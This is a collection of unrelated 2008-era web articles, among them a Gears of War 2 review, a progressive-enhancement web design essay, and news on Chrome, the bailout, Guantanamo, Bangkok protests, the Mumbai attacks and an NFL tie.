There are also a couple of stages that seem to pastiche well - worn videogame clichés ( at least I hope they 're a pastiche ) – these do n't work well and draw you out what is an incredibly immersive experience for most of the time .
Away from the single - player campaign , me and Greg spent a long time playing Horde , the frantic new co-op mode , in which five human comrades battle together through waves of locust soldiers .
The aim is to kill a set number of enemies within the strict time limit , and any soldier downed during the effort is out of the game until the stage is beaten .
The fights take place over a number of locations festooned with gun emplacements , burned out vehicles and withered trees .
It 's an absolute blast , a sort of turbo - charged sci-fi version of Assault on Precinct 13 .
Locust troops of every kind charge at you , including loads of GoW favourites and all the newcomers .
And the really cool thing is , when you are killed , you get access to a god mode that lets you explore the whole area , informing your still - living mates about enemy positions .
The new Submission mode – or as Epic calls it ' Meat Flag ' - is a killer too .
It 's essentially capture the flag , except , you 're out to capture a ' stranded ' - a civilian human – who must be shot to his knees , then grabbed and dragged to your base .
The carrier can only use a handgun to protect himself so teamwork is essential .
Also , if the guy with the stranded gets taken out , the freed civilian turns into a bad ass killing machine , slaughtering anyone caught nearby with his shotgun .
" It was an idea that probably came up while we were drunk one night , " explained Epic 's Mike Capp to me the morning after the press event .
" A flag with a gun … "
So , yeah , amazing .
An utter screaming headrush of a game , which provides totally and unapologetically ceaseless entertainment .
There 's lots I have n't sampled yet – the drop - in / drop - out co-op sounds fun , allowing players of different abilities to jump into each other 's games , with the difficultly level altering accordingly .
There are intriguing narrative strands developing in here too , including – strangely enough - an ongoing love story .
There 's also a question that keeps coming back throughout the game , in plot points , and dialogue and artifacts discovered during your journey .
Is this desperate , nightmarish tragedy of an existence really worth all the effort ?
It 's like the 2029 scenes from Terminator – just violence and death handed out by a totally alien intelligence .
Gears of War 2 could well be the most nihilistic shoot - 'em - up ever created .
The great thing is , whatever you 're fighting for , even if it 's worthless , it 's terrific fun .

It has something to do with something that is called marihuana .
I believe it is a narcotic of some kind .
Colloquy on the House floor prior to passage of the Marihuana Tax Act .
Introduction
We wish to express our sincere appreciation to the students who assisted us in the preparation of the tables at Appendix A . Because the drug statutes of the several states are particularly confusing and difficult to find , and because so many jurisdictions have recently changed their drug laws , the preparation of the chart required long , tedious work which so many were kind enough to perform .
To them , our most sincere thanks .
We should like to thank especially Michael A. Cohen , John F. Kuether , W. Tracey Shaw , Alan K. Smith , and Allan J. Tanenbaum , all students at the University of Virginia School of Law , whose research assistance and tireless effort were invaluable .
We are particularly indebted to Professor Jerry Mandel who supplied us with much of the raw data used in the historical case studies in this Article .
In his excellent article on drug statistics in the Stanford Low Review , Problems with Official Drug Statistics , 21 STAN .
L. REV . 991 ( 1969 ) , Professor Mandel suggested in a footnote that someone should attempt a history of the passage of anti-marijuana legislation .
We have followed his suggestion and earnestly hope that our product will fill this gap .
A modified and expanded version of this Article will be published in book form in the spring of 1971 .

Fazal Fazlin has an American story .
Raised in Karachi , Pakistan , he came to the United States in 1969 with an engineering degree and little else .
Now he lives on a five - acre estate in the waterfront mansion that once belonged to Nelson Poynter , luminary of the newspaper business .
Poynter , who died in 1978 , was the owner of The St. Petersburg Times , a bastion of journalistic excellence and liberal tradition .
Liberalism was never Fazlin ’s thing .
For most of his rags - to - riches American life , he was a Nixon Republican .
“ I felt Nixon was a great President , ” Fazlin , a dapper 58 , told me .
“ He opened relations with China , and that ’s what kept inflation down .
He had a really good command of the world . ”

Gastkommentar Warum die Wirtschaftskrise uns noch lange quälen wird
Schluss mit der Beschönigung : Die Finanzkrise trifft Europa viel härter als erwartet , glaubt der Berliner Ökonom Henrik Enderlein - und sie ist längst nicht vorbei .
Wie schlimm sie eskaliert , das bestimmen nicht nur die Zentralbanken , sondern vor allem die Konsumenten in Amerika und China .
Since 1994 , the web development community has beaten graceful degradation ’s drum .
A carry - over from the engineering world , the concept was , at its core , about giving the latest and greatest browsers the full - course meal experience while tossing a few scraps to the sad folk unfortunate enough to be using Netscape 4 .
It worked , sure , but it did n’t really match Tim Berners - Lee ’s original vision for a universally accessible web .
Article Continues Below
About a decade later , several smart folks began to question graceful degradation and found it lacking on many levels .
Concerned with content availability , overall accessibility , and mobile browser capabilities , they sought a new way to approach web development — a way that focused on the content and did more than just pay lip service to older devices .
At SXSW in 2003 , Steve Champeon and Nick Finck gave a presentation titled “ Inclusive Web Design For the Future . ”
There , they unveiled a blueprint for this new way of approaching web development .
Steve also gave it a name : progressive enhancement .
There ’s a ( subtle ) difference #section2
In case you are scratching your head , trying to see how graceful degradation and progressive enhancement differ , I ’ll say this : it ’s a matter of perspective .
Both graceful degradation and progressive enhancement consider how well a site works in a variety of browsers on a variety of devices .
The key is where they place their focus and how this affects workflow .
The graceful degradation perspective #section3
Graceful degradation focuses on building the website for the most advanced / capable browsers .
Testing in browsers deemed “ older ” or less capable usually takes place during the last quarter of the development cycle and is often restricted to the previous release of the major browsers ( IE , Mozilla , etc. ) .
Under this paradigm , older browsers are expected to have a poor , but passable experience .
Small fixes may be made to accommodate a particular browser .
Because they are not the focus , little attention is paid beyond fixing the most egregious errors .
The progressive enhancement perspective #section4
Progressive enhancement focuses on the content .
Note the difference : I did n’t even mention browsers .
Content is the reason we create websites to begin with .
Some sites disseminate it , some collect it , some request it , some manipulate it , and some even do all of the above , but they all require it .
That ’s what makes progressive enhancement a more appropriate paradigm .
It ’s why Yahoo ! swiftly adopted it and used it to create their Graded Browser Support strategy .
So how does it work ?
#section5
Getting into the progressive enhancement mindset is quite simple : just think from the content out .
The content forms the solid base on which you layer your style and interactivity .
If you ’re a candy fan , think of it as a Peanut M&M :
The Chocolatey Layers of Progressive Enhancement
Start with your content peanut , marked up in rich , semantic ( X) HTML .
Coat that content with a layer of rich , creamy CSS .
Finally , add JavaScript as the hard candy shell to make a wonderfully tasty treat ( and keep it from melting in your hands ) .
If you ’re at all familiar with the web standards movement ’s mantra — separation , separation , separation — this makes perfect sense .
Web standards - based development has often been likened to a layer cake ( or , if you want to get really fancy , a trifle ) .
I prefer the Peanut M&M analogy , because in it , the layers envelop the content completely , in much the same way our styles and scripts wrap our content .
If you ’ll indulge my food analogy a bit longer ( I hope I ’m not making you hungry ) , I ’ll explain why this approach is better and how the layers interact within this paradigm .
The peanut#section6
Some people like peanuts ; in fact , some people prefer peanuts to Peanut M&Ms ; .
Similarly , some folks ( and things like search engine spiders ) want just the content .
Then there are folks who ca n’t handle the chocolate and candy layers on top of the peanut ( diabetics , for example ) .
Like them , people on mobile devices or older browsers may not be able to see your pretty design or interact with your slick Ajax - driven interface .
Making sure your markup conveys the greatest level of detail about the content it wraps around is essential to offering a basic experience to these users .
The chocolate coating #section7
Next , you can delicately dip your content into a warm bath of ambrosial CSS — but before you jump to the hard candy shell , there are some additional considerations .
There are folks who love chocolate covered peanuts .
These folks are like the middle tier of users who have some level of CSS support , but may not have decent JavaScript support .
Or they may work at a company where the IT security folks are more than a little phobic about JavaScript .
For them , JavaScript may be disabled entirely .
Whether Goober - inclined or Goober - limited , these folks deserve to be catered to .
There are several progressively - enhanced ways to apply styles to your content , and they will be the topic of the second article in this series .
The hard candy shell # section8
Finally , you can introduce JavaScript into the mix .
With the rich interaction possibilities it provides , as well as its ability to manipulate and interact with the content and presentation layers , JavaScript really is the ingredient that can pull a site together into an “ experience . ”
I ’m not sure exactly how the hard candy shell is added to an M&M ( my guess is that it ’s another dip of some sort ) , but adding JavaScript - based functionality and interactivity to your websites is a breeze when you think progressive enhancement .
And , in much the same way as M&Ms ; are available in a variety of colors , the JavaScript experience can vary based on the capabilities of the browser or device attempting to use it .
As you probably know , this type of development is called unobtrusive JavaScript .
I ’ll cover those techniques and practices in the third and final article in this series .
Putting it all together #section9
Developing with progressive enhancement is actually quite simple once you understand the concept and begin putting it into practice ; perhaps even simpler than making candy .
The next two articles in this series will help you hone your progressive enhancement skills with CSS and JavaScript , and will show you how the philosophy translates into code .

We must stop this from happening !
Enough taxing of future generations and giving money to the rich .
We 've watched the rapid evolution of Google 's beta Chrome browser since it first appeared .
Chrome , apparently , will not remain in an indefinite period of beta testing for the rest of its life .
Speaking to The Times , Sundar Pichai , Google vice president , stated that the browser will exit beta in January .
Google , meanwhile , is exploring its distribution options and examining the various ways it might improve its market share .
" We will probably do distribution deals , ” Pinchai told The Times .
" We could work with an OEM ( Original Equipment Manufacturer ) and have them ship computers with Chrome preinstalled . "
Doing so could significantly change the browser market 's competitive landscape .
As of the end of October , Microsoft commands some 71 percent of the market , with Firefox hovering near 20 percent , according to NetApplications .
Two - thirds of that last nine percent is held by Safari , with a ragtag collection of other clients collectively holding on to about three percent of the total number of web users .
Shipping Chrome as the default browser on a system would n't have an immediate impact on browser standings , but in the longer term , Google 's share of the market would almost certainly rise .
Google is also working on Macintosh and Linux versions of its shiny toy .
Microsoft insists it can fend off any challenge Chrome might pose .
When asked how OEM distribution of Chrome might effect Microsoft 's market share , John Curran , the UK head of Windows , told The Times that " The browser space is competitive and people end up choosing what ’s best for them .
For the overall majority of UK users , that ’s Internet Explorer . "
Curran 's comments gloss over the fact that many consumers do n't actually do much choosing of Internet Explorer .
History suggests that the vast majority of users are actually remarkably agnostic over what browser they use , and often opt for whatever ships on the system .
If Google does cut deals to distribute Chrome as the default browser , it would be an interesting test of whether or not Microsoft 's brand - loyalty perception is grounded in anything even resembling fact .
Currently , Firefox usage in the UK ( approximately 12 percent ) is much lower than the worldwide average of ~ 20 percent , but whether those numbers reflect a genuine preference for Microsoft products or inertia is unclear .
Microsoft had initially planned to launch Internet Explorer 8 before the end of 2008 , but announced yesterday that its return salvo will be delayed into 2009 .
The company now plans to drop a release candidate ( RC ) version of the browser in the first quarter of 2009 , with the actual launch occurring thereafter .
If the IE8 team holds that schedule , I expect we 'll see IE8 late in the first quarter or early in the second — the window between RC availability and product launch is usually short .
Google has n't pumped a great deal of effort into promoting Chrome to date , but this will change once the browser exits beta .
In his interview with The Times , Pichai indicated that the search giant intends to back Chrome with all of the massive resources at its disposal .
" We will throw our weight behind it , " said Pichai .
" We ’ve been conservative because it 's still in beta , but once we get it out of beta we will work hard at getting the word out , promoting to users , and marketing will be a part of that . "
Internet Explorer 's adoption curve / use rate .

It 's hard not to grin just a little when you read something like that .
When Microsoft went after Netscape and began bundling IE as a no-cost addition to Windows , a number of observers cried foul .
Microsoft 's size , cash reserves , and OEM contracts gave the company an overwhelming advantage when it came to negotiating which browser would ship on a PC .
Netscape Navigator 's market share .

If you do n't know how that story ended , it 's pictured in the graphs above .
Since the launch of IE3 in 1996 to today , Microsoft has never had to compete for browser share against a company as large and powerful as itself .
Once Chrome launches , that 's going to change ; Google has the money and the expertise to match Microsoft dollar - for - dollar and feature - for - feature .
If both companies stay on track , 2009 may be the year we finally test John Curran 's hypothesis , both in the UK and around the world .
If you ’re flying to Australia anytime soon , be prepared to show a lot of skin at the airport .
From now until the end of November , Melbourne airport is testing out new X - ray scanners that can see through clothing and leave little to the imagination .
The scanners may soon replace pat downs with “ virtual strip searches , ” which officials say will save time at security check points .
For the trial period , only passengers who volunteer will be scanned .
The full - body scanners use low - energy X - rays that reflect off skin to provide chalky images of naked bodies .
They will reveal any hidden objects , even nonmetal ones that would be bypassed by traditional metal detectors .
But is it really necessary to see everything ?
Apparently , yes .
Cheryl Johnson , general manager of the Office of Transport Security , says they decided not to blur out genitals or breasts because it would “ severely limit the detection capabilities . ”
They will , however , blur out people ’s faces .
Johnson also assures passengers that the images will not be saved and that the security officer examining the images will be located in a private area ( supposedly so they wo n’t be able to compare X - ray images with the real thing ) .
Not surprisingly , many are not happy with the idea of a peep show at check - in .
The European Commission has been pushing to add these scanners to its airports but the European Parliament ( the legislative body of the EU ) voted today to put the measure on hold for further study .

The Case Against Hillary
Yes , I know the " Team of Rivals " argument for Hillary Clinton as the ideal secretary of state for the Obama administration .
But before it ’s a done deal , let ’s consider the counter - argument that this crew could prove to be a “ Ship of Fools . ”
In questioning whether Clinton is the right person for Foggy Bottom , I am not in any way disagreeing that she should have a big voice in the administration and in the nation ’s future .
She would have made an outstanding vice president ( or president , for that matter ) , and she would be a sublime Senate majority leader .
It ’s easy to imagine her as the legislative architect for Obama ’s domestic agenda .
That ’s a role she has been preparing to play her whole life .
But she ’s an unwise choice for secretary of state , and here ’s why :
The game changer in foreign policy is Barack Obama himself .
Traveling in Europe earlier this month , I was stunned by the excitement he has aroused .
The day after the election , the French newspaper “ Le Monde ” carried a cartoon atop its front page that showed Obama surfing a red , white and blue wave .
Above him , it said : “ Happy New Century ! ”
You can sense the same enthusiasm around the world -- in the Middle East , Africa , Latin America and Asia .
Even among the followers of radical groups , such as Hamas and the Taliban , Obama has inspired a sense of change and opportunity .
Given this ferment , the idea of subcontracting foreign policy to Clinton -- a big , hungry , needy ego surrounded by a team that ’s hungrier and needier still -- strikes me as a mistake of potentially enormous proportions .
It would , at a stroke , undercut much of the advantage Obama brings to foreign policy .
And because Clinton is such a high - visibility figure , it would make almost impossible ( at least through the State Department ) the kind of quiet diplomacy that will be needed to explore options .
The foreign policy landscape already has too many big elephants wandering out from the Senate , with Sen .
Joe Biden becoming vice president and former presidential candidate John Kerry taking over as chairman of the Senate Foreign Relations Committee .
With this many big talkers on the loose , it ’s terrifying to imagine what life will be like in a few months for the booker on “ Meet the Press . ”
And I have n’t even mentioned here the biggest elephant of all , former President William Jefferson Clinton .
I am a big fan of the ex-prez ; he ’s one of the wisest and most effective thinkers on foreign policy that I know .
But it ’s even harder to imagine him fitting in as the spouse of the secretary of state than as spouse of the president or vice president .
I ’ll leave to the transition ’s team legal vetters the question of Bill Clinton ’s potential conflicts of interest , after having been a “ buckraker ” speaker and door opener for wealthy business and political leaders around the world .
But those leaders would surround almost everything Hillary Clinton tried to do in Foggy Bottom .
The most effective secretary of state I ’ve covered in 30 years of writing about foreign policy was George Shultz .
He was also the most apolitical .
The least effective I can remember was Sen. Ed Muskie , another failed presidential candidate .
Someone in Jimmy Carter ’s entourage must have had a “ team of rivals ” idea when they named Muskie to succeed Cyrus Vance .
But it was a bad idea then .
And I ’m sorry to say , it ’s a bad idea now .
A potential health hazard ?
Harvard scientists found people who ate bacon at least five times a week were 59 % more likely to develop the disease than those who never did .
They also found people who frequently ate skinless chicken had a 52 % greater risk .
Chemicals called nitrosamines and heterocyclic amines may be to blame .
The study appears in the American Journal of Clinical Nutrition .
The link between diet and cancer is complex and difficult to unravel
Dr Emma Knight
The Harvard team studied data on nearly 136,000 people .
The participants were followed for up to 22 years , during which time 808 developed bladder cancer .
Nitrosamines , chemicals which are often found in processed meats and in particularly high levels in bacon , are known to be carcinogenic in high quantities .
Heterocyclic amines , also known carcinogens , form when meat is cooked at high temperatures .
Compared with skinless chicken , cooked chicken with skin is known to contain a smaller amount of heterocyclic amines .
More work needed
However , the research is far from definitive .
The researchers also found people who ate bacon and other processed meats frequently were also more likely to smoke and to take in more fat and fewer vitamins .
They were also less likely to exercise .
Dr Emma Knight , science information manager at Cancer Research UK , said : " The link between diet and cancer is complex and difficult to unravel but we know that eating lots of red and processed meat can increase our risk of some types of cancer .
" More research is needed before we can say for sure whether or not eating bacon in particular affects bladder cancer risk .
" For now , our advice remains to eat a balanced diet that is low in fat , processed and red meat , and rich in vegetables , fruit and fibre . "
More than 10,000 people a year are diagnosed with bladder cancer in the UK .

Thousands of anti-government protesters in Bangkok today forced parliament to shut down and a group of riot police to retreat in what activists called their " final showdown " to oust a corrupt administration .
Parliament postponed a joint session of both houses after singing and dancing protesters wearing yellow shirts in dedication to Thailand 's monarch surrounded its gates and reportedly cut electricity to the building .
Riot police barricaded the parliament with metal barriers and stood guard inside the compound .
Nearby , dozens of police in riot gear retreated inside Bangkok 's police headquarters as several hundred protesters pushed past a metal barricade and blocked off the street with razor wire .
Rallies were staged at the finance ministry and other key offices .
The People 's Alliance for Democracy has occupied the grounds of the prime minister 's office for three months , virtually paralysing the government , which they allege is the puppet of the former prime minister Thaksin Shinawatra .
Protesters accuse Thaksin , who was ousted by a 2006 military coup , of corruption and abuse of power .
Thaksin is in exile , a fugitive from a two - year jail term imposed after he was convicted last month of violating a conflict of interest law .
Today 's protest was not the first time the alliance has called for a final showdown with the government , but it was spread across a wider area of the capital than earlier rallies .
Protest leaders say their goal is to stop the government from functioning .
" One mission has been accomplished .
We have won our victory here , " a protest leader , Somsak Kosaisuk , said outside parliament .
" We 'll keep doing this until they quit . "
He called on protesters to move on to the government 's makeshift office at Bangkok 's old international airport to interrupt a cabinet meeting .
The protesters want the current prime minister , Somchai Wongsawat , who is Thaksin 's brother - in - law , to resign .
Somchai was in Peru for a summit of Pacific Rim leaders and is expected to return midweek .
The house speaker , Chai Chidchob , said the parliamentary session would be rescheduled " when the situation returns to normal " .
The demonstrators initially called the protest to block parliament from debating a bill to rewrite the constitution , a measure they said would help Thaksin stage a comeback .
Riot police armed with shields and batons were under orders to use " as little force as possible " and to try to avoid tear gas , said the Bangkok police chief , Lieutenant General Suchart Maunkaew .
He said police were not carrying guns .
The last time the group marched on parliament , police efforts to disperse them resulted in running street battles .
Two people were killed and hundreds injured in the October 7 violence .
The alliance has accused police of being behind an attack last week in which grenades killed two protesters during demonstrations at and near the occupied Government House .
Authorities have denied the charge .
Alliance supporters are largely middle - class citizens who say Thailand 's electoral system is susceptible to vote - buying and that the rural majority , the Thaksin camp 's power base , is not sophisticated enough to cast ballots responsibly .
They propose replacing an elected parliament with one that is mostly appointed , a move that critics see as a way to keep power in the hands of the educated , urban elite .
Unlike John McCain , who has n't held a press conference in 41 days , Barack Obama faced the press today to respond to Paulson and Bernanke 's testimony on the proposed $ 700 billion Wall St. bailout .
The Democratic candidate laid out clearly his short - term and long - term goals , and even took questions from the press afterwards .

" This plan can not be a welfare program for Wall St. executives .
The power to spend $ 700 billion dollars of taxpayer money cannot be left to the discretion of one man no matter who he is or what party he is from .
I have great respect for Secretary Paulson , but he can not act alone . "
Full transcript below the fold :
Yesterday , the President said that Congress should pass his proposal to ease the crisis on Wall Street without significant changes or improvements .
Now , there are many to blame for causing the current crisis , starting with the speculators who gamed the system and the regulators who looked the other way .
But all of us now have a stake in solving it and saving our financial institutions from collapse .
Because if we do n't , the jobs and life savings of millions will be put at risk .
Given that fact , the President 's stubborn inflexibility is both unacceptable and disturbingly familiar .
This is not the time for my - way - or - the - highway intransigence from anyone involved .
It 's not the time for fear or panic .
It 's the time for resolve , responsibility , and reasonableness .
And it is wholly unreasonable to expect that American taxpayers would or should hand this Administration or any Administration a $ 700 billion blank check with absolutely no oversight or conditions when a lack of oversight in Washington and on Wall Street is exactly what got us into this mess .
Now that the American people are being called upon to finance this solution , the American people have the right to certain protections and assurances from Washington .
First , the plan must include protections to ensure that taxpayer dollars are not used to further reward the bad behavior of irresponsible CEOs on Wall Street .
There has been talk that some CEOs may refuse to cooperate with this plan if they have to forgo multi-million - dollar salaries .
I cannot imagine a position more selfish and greedy at a time of national crisis .
And I would like to speak directly to those CEOs right now :
Do not make that mistake .
You are stewards for workers and communities all across our country who have put their trust in you .
With the enormous rewards you have reaped come responsibilities , and we expect and demand that you to live up to them .
This plan cannot be a welfare program for Wall Street executives .
Second , the power to spend $ 700 billion of taxpayer money cannot be left to the discretion of one man , no matter who he is or which party he is from .
I have great respect for Secretary Paulson , but he can not act alone .
We should set up an independent board that includes some of the most respected figures in our country , chosen by Democrats and Republicans , to provide oversight and accountability at every step of the way .
I am heartened that Secretary Paulson appeared to be softening on this position in his testimony this morning .
Third , if taxpayers are being asked to underwrite hundreds of billions of dollars to solve this crisis , they must be treated like investors .
The American people should share in the upside as Wall Street recovers .
There are different ways to accomplish this , including putting equity into these firms instead of buying their troubled assets .
But regardless of how we structure the plan , if the government makes any kind of profit on this deal , we must give every penny back to the taxpayers who put up the money in the first place .
And after the economy recovers , we should institute a Financial Stability Fee on the entire financial services industry to repay any losses to the American people and make sure we are never asked to foot the bill for Wall Street 's mistakes again .
We can ask taxpayers to make an investment in the stability of our economy , but we cannot ask them to hand their money over to Wall Street without some expectation of return .
Fourth , the final plan must provide help to families who are struggling to stay in their homes .
We cannot simply bailout Wall Street without helping the millions of innocent homeowners who are facing foreclosure .
There are a number of ways we can accomplish this .
For example , we should consider giving the government the authority to purchase mortgages directly instead of simply mortgage - backed securities .
In the past , such an approach has allowed taxpayers to profit as the housing market recovered .
This is not simply a question of looking after homeowners , it 's doubtful that the economy as a whole can recover without the restoration of our housing sector , including a rebound in the home values that have suffered dramatically in recent months .
Finally , the American people need to know that we feel as great a sense of urgency about the emergency on Main Street as we do about the emergency on Wall Street .
I have repeatedly called on President Bush and Senator McCain to join me in supporting an economic stimulus plan for working families - a plan that would help folks cope with rising food and gas prices , save one million jobs by rebuilding our schools and roads , help states and cities avoid painful budget cuts and tax increases , and help homeowners stay in their homes .
Let me be clear - we should n't include this stimulus package into this particular legislation , but as we solve the immediate crisis on Wall Street , we should move with the same sense of urgency to help Main Street .
It is absolutely wrong to suggest that we cannot protect American taxpayers while still stabilizing our market and saving our financial system from collapse .
We can and must do both .
In summary , there is no doubt negotiations over the next few days will be difficult .
I will continue to keep in close touch with Secretary Paulson , Chairman Bernanke , and the leaders of Congress to ensure that we can work in a bipartisan manner to get this done as quickly as possible .
Our country is being tested by a very serious crisis .
We are all in this together , and we must come together as Democrats and Republicans , on Wall Street and on Main Street to solve it .
And with the proper spirit of cooperation , I know we can .
WASHINGTON ( Reuters ) - Five of six Algerians held nearly seven years at the U.S. military prison at Guantanamo Bay in Cuba must be released , a federal judge ruled on Thursday in a setback for the Bush administration .

U.S. District Judge Richard Leon ruled from the bench after holding the first hearings under a landmark Supreme Court ruling in June that gave Guantanamo prisoners the legal right to challenge their continued confinement .
U.S. President - elect Barack Obama has promised to close the prison camp after he takes office in January .
Meanwhile , U.S. judges in Washington are moving ahead with case - by - case reviews of about 200 detainee legal challenges .
Reading his ruling as the detainees listened in Guantanamo via a telephone hookup , Leon said the U.S. government failed to prove the five men who had been living in Bosnia had planned to travel to Afghanistan to fight against U.S. forces .
He ordered the U.S. government to take all necessary and appropriate diplomatic steps to facilitate their release “ forthwith . ”
There are about 255 detainees at Guantanamo , which was set up in January 2002 to hold terrorism suspects captured after the September 11 attacks on the United States by al Qaeda militants .
Most have been held for years without being charged and many have complained of abuse .
The Algerians , who were picked up by Bosnian authorities in October 2001 , were sent in January 2002 to Guantanamo and remain held there as “ enemy combatants ” without being charged .
U.S. President George W. Bush said in 2002 the six men had been planning a bomb attack on the U.S. embassy in Sarajevo .
But Justice Department attorneys said last month they no longer would rely on those accusations to justify the continued detention of the six men .
However they argued the Algerians should be held because they planned to go to Afghanistan in late 2001 to fight U.S. forces .
CAN’T JUDGE SOURCE’S CREDIBILITY
In ordering the release of the five men , Leon said the allegation was based on only one unnamed source and he did not have enough information to judge the source ’s reliability or credibility .
“ To rest on so thin a reed would be inconsistent with this court ’s obligation ” to protect the Guantanamo detainees from the risk of erroneous or unlawful detention , Leon said .
He ruled the government did provide enough evidence that one of the detainees , Belkacem Bensayah , supported al Qaeda and planned to fight against the United States in Afghanistan .
The ruling was the second involving Guantanamo prisoners seeking their release and another Bush administration defeat .
Last month , U.S. District Judge Ricardo Urbina ordered the release of 17 Chinese Muslims , members of the Uighur ethnic group , after the government acknowledged they were not enemy combatants .
Their release has been stayed , pending an appeal .
Leon , who was appointed to the bench by Bush in 2002 , held hearings in November to consider the government ’s factual basis for holding the six detainees .
The hearings were closed because of classified evidence .
He was the first federal judge to hold a full hearing under habeas corpus -- a long - standing legal principle by which people can challenge their imprisonment -- in a Guantanamo case since the Supreme Court ’s ruling .
The six Algerians were among the more than 30 Guantanamo prisoners who won before the Supreme Court .
The five ordered released were Lakhdar Boumediene , Mohamed Nechla , Mustafa Ait Idir , Saber Lahmar and Hadj Boudella .
Nadja Dizdarevic , who is Boudella ’s wife , told Reuters by telephone in Bosnia , “ This is the victory of justice even though it comes after seven years of legal struggle . ”
She said U.S. and Bosnian authorities must ensure that the five get back to Bosnia , instead of being extradited to Algeria , and must allow them to join their families .
Leon said the U.S. government can appeal his ruling on the five men , but strongly urged top administration officials to forgo an appeal that would take as long as two years .
Leon also cautioned that the case was “ unique ” and that “ few if any ” of the other detainee challenges were like it .
The White House said it disagreed with the portion of the ruling ordering the five men must to be released , but was pleased that one Algerian was affirmed as an enemy combatant and can continue to be held at Guantanamo .
White House spokesman Tony Fratto said the Justice Department was reviewing the decision on the five Algerians .
Justice Department spokesman Peter Carr said the ruling demonstrated the need for Congress to adopt procedures that are fair to the detainee , but allow “ the government to present its case without imperiling national security . ”
BAGHDAD ( Reuters ) -
The Iraqi government is confident that president - elect Barack Obama will not jeopardize Iraq ’s improving security by hastily withdrawing U.S. troops , Foreign Minister Hoshiyar Zebari said on Wednesday .
Slideshow ( 2 images )
Obama has “ reassured us that he would not take any drastic or dramatic decisions , ” Zebari told BBC television .
“ He will consult with the Iraqi government and the U.S. military in the field , but believes strongly that a phased withdrawal of U.S. forces in Iraq will put more responsibility on the shoulders of the Iraqi government . ”
Obama opposed the U.S. war in Iraq from the beginning , and his promise to pull combat troops out of the country by mid-2010 was a cornerstone of his campaign .
The administration of President George W. Bush had long resisted deadlines for withdrawal , but is now working on a security pact that would set 2011 as an end date for the U.S. troop presence , a concession that moved U.S. policy closer to Obama ’s proposals .
“ We are negotiating right now with the U.S. for a timeline of 2011 for U.S. forces to withdraw from the country ...
Our position has become much closer to what Senator Obama during his election campaign called for , ” Zebari said .
Washington and Baghdad are still negotiating how firm the deadline will be .
The plan also envisions halting U.S. patrols of Iraqi streets by mid-2009 .
Violence has dropped dramatically across Iraq , but U.S. generals and Iraqi leaders say Iraqi forces are not yet ready to assume full control and a hasty pullout could jeopardize gains .
In another interview Zebari said he believed Obama would take conditions on the ground into account before any withdrawal .
“ When there is a reality check , I think any U.S. president has to look very hard at the facts on the ground , ” he told Al - Jazeera television .
“ The gains that we have attained and won with hard struggle and a great deal of sacrifice need to be sustained . ”

[ Note : Below is the contents of a letter sent by a friend who lives in Alaska . ]
Dear Friends and family ,
Many of you in the lower 48 are hearing that we approve of McCains pick as a running mate , Sarah Palin , for this election .
This is not true .
Please look at and listen to this video of our rally yesterday here in Anchorage .
We are as patriotic as anyone to be willing to get out on the streets and try to reach out to everyone in America to HEAR OUR VOICE and DO THE RESEARCH on this candidate .
We believe Palin is not the right person to have in control of the United States .
As you can see from just this rally over 1500 Alaskans showed up yesterday to speak out and many people were there in spirit but were afraid to get out and speak out for fear of violence from the right wing radio jock who encouraged his listeners to harass us .
The rally was probably the largest protest ever held in Alaska .
It was peaceful and empowering .
It was planned by a few moms a few days ago and spread by word of mouth and emails .
Please read between the lines of whatever information you are getting in your local newspapers in support of Sarah Palin .
Please feel free to email me up here for more information on her experience or lack of .
Our country , and our economy , our children 's future , and our planet is in a crisis , and we are still at war .
Sarah Palin is simply Bush in a skirt and lipstick .
Do n't be fooled by her .
Late Wednesday night , Mumbai , India found itself the target of a ferocious terrorist attack , and the situation remains unresolved even now , three days later .
According to reports , upwards of 60 young men entered Mumbai in small inflatable boats on Wednesday night , carrying bags filled with weapons and ammunition , and spread out to nine locations to begin their attacks .
Lobbing grenades and firing their weapons , they entered hotels , a railway station and several other buildings , killing scores and wounding even more .
As of this moment , the identity of the attackers has yet to be definitively determined , though there are reports indicating some of the gunmen were Pakistani - at least nine of them have been killed , nine more arrested .
As of this writing , there were a reported 151 people killed from 11 different countries - though nearly 100 were Indian .
More than 300 injuries have also been reported - those numbers may yet rise as several hostage situations still exist in the city .

CINCINNATI -- Donovan McNabb expected to keep playing until someone scored , no matter how long it took .
Mercifully , the NFL 's rules set a time limit on terrible play .
Eagles 13 , Bengals 13 .
It could n't have ended any other way .
McNabb fumbled and threw three interceptions in regulation Sunday , and the Bengals botched the only scoring chance in overtime , leaving the equally inept teams with the NFL 's first tied game in six years .
Cincinnati's Shayne Graham missed a 47 - yard field goal with 7 seconds left in overtime , falling to the ground as the ball sailed a few inches wide to the right .
It was a fitting finish to a game played like the very definition of a tie .
Despite all the shanked punts and trick plays , this one went nowhere .
" Terrible , " Bengals quarterback Ryan Fitzpatrick said .
No one was more surprised than McNabb that it ended so soon -- 3 hours , 46 minutes after the opening kickoff .
The 10th - year quarterback thought it would keep going until someone scored , just like a playoff game .
Wrong .
" I did n't know that , " said McNabb , who played a leading role in keeping it tied .
" I 've never been part of a tie .
I never even knew it was in the rule book .
I was looking forward to getting the opportunity to get out there and try to drive to win the game .
But unfortunately with the rules , we settled with a tie . "
It was the first tied game in the NFL since Nov. 10 , 2002 , when the Falcons and Steelers finished 34 - 34 with Michael Vick and Tommy Maddox matching each other pass for pass .
In this one , the teams matched each other gaffe for gaffe .
The Eagles ( 5 - 4 - 1 ) have yet to win a close game this season , going 0 - 4 with a tie in games decided by less than a touchdown .
McNabb had a big hand in this one , matching his career high with three interceptions and setting up 10 of Cincinnati 's points .
He nearly had another pass picked off in overtime , but Johnathan Joseph dropped a potential interception near midfield .
Each team had three chances in the extra 15 - minute quarter , but only the Bengals ( 1 - 8 - 1 ) got close enough to try a field goal .
They missed it , leaving them with only their second tied game in franchise history .
They played Houston to a 31 - 31 tie in 1969 , their second season .
" We did n't win .
We did n't lose , either , " said Graham , who had been 6 - for - 6 from 40 - 49 yards .
" But sometimes , tying stings a little more . "
Philadelphia had n't finished with a tie since a 10 - 10 game against Baltimore in 1997 .
The Eagles ' defense had eight sacks and compensated for McNabb 's fumble by pulling off a goal - line stand from the 1 in the first half .
The game soon settled in that pattern -- a blitzing defense trying to erase the offense 's mishaps .
It ended in a draw .
McNabb , who had only five interceptions coming in , went 28 - of - 58 for 339 yards .
He repeatedly missed open receivers in an offense that has come to rely on him almost entirely because it can't run .

Allegations about 2002 Georgia election raise doubts on current voting Muriel Kane
Published : Friday November 21 , 2008
Print This Email This
